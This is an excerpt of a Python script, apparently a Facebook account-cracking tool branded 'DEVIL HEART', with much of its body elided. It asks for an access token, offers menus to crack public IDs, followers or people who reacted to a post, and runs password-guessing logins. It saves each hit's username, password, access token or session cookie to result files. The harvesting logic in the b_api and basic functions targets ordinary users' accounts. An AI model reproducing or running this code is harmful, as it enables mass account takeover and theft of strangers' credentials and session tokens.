...
def banner():
 ...
 MR.UNKNOWN HACKER%s \n Welcome to the DARK WORLD By : %sUNKNOWN HACKER \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
...
def masuk():
    ...
    if rom in(""):
        ...
        jalan("\n%s [%s!%s] ALONENESS IS THE BIGGEST TRUTH OF LIFE"%(P,M,P))

    	romz = raw_input('%s [?] Token : %s'%(P,K))

        if romz in(""):

        	print("%s [!] Bro Paste Token Again "%(M));exit()
...
class ngentod:
    ...
    def romiy(self):
        ...
        if unikers in ('Y', 'y'):
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n %s[%s*%s] DEVIL HEART %sON %sResult save to >%s DEVIL HEART/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)

                            print '%s [%s*%s] DEVIL HEART %sOFF %sResult save to > %s DEVIL HEART/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            ...
                            print ('\n %s[!] Bro Try Again'%(M));zona()

                    print '\n%s [ Fill Methode Crack - silahkan coba satu² ]\n'%(P)

                    print ' [%s01%s] B-API Method (DEVIL-HEART)'%(K,P)
            ...
            print '\n%s [ DEVIL HEART METHOD - UNKNOWN RKBDHKS ]\n'%(P)
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '%s [%s*%s] DEVIL HEART %sOFF %Result save to > %s DEVIL HEART /OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            ...
            print("\n%s [!] Bro Paste Token Again "%(M));self.langsung()
    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                print '\r %sDEVIL HEART-OFF %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])

                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))

                open('DEVIL HEART/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                ...
                try:
                    ...
                    print '\r %sDEVIL HEART-OFF %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)

                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))

                    open('DEVIL HEART/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                ...
                print '\r %sDEVIL HEART-OFF %s ◊ %s           ' % (K,user,pw)

                cp.append('%s ◊ %s' % (user,pw))

                open('DEVIL HEART/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
    ...
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %sDEVIL HEART-OFF %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
...
def uas():
    ...
    if u == '':
        ...
        print("%s [!] Bro Paste Token Again "%(M));jeda(2);uas()
...
def menu():
    ...
    print (' [%s01%s] Crack public id'%(K,P)) 

    print (' [%s02%s] Crack followers id'%(K,P)) 

    print (' [%s03%s] Crack reaction to post id'%(K,P)) 

    print (' [%s04%s] %sStart attack %s'%(K,P,H,P)) 
    ...
    if unik == '':
        ...
        print("%s [!] Bro Paste Token Again "%(M));jeda(2);menu()
